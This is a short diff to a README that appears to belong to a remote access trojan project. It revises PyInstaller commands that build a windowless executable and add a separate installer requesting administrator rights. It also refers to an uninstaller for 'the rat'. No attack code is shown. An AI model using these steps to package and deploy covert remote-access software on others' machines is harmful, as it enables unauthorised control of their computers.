@@ -17,7 +17,13 @@ uv add --dev pyinstaller
 ### Generate exe file
 
 ```python
-uv run pyinstaller --onefile --noconsole --uac-admin --paths src --name "<your-app-name>" main.py
+uv run pyinstaller --onefile --noconsole --paths src --name "<your-app-name>" main.py
+```
+
+### Generate installer
+
+```python
+uv run pyinstaller --clean --onefile --console --uac-admin --collect-data certifi --name "installer" installer.py
 ```
 
 ### Run uninstaller.ps1 to uninstall the rat
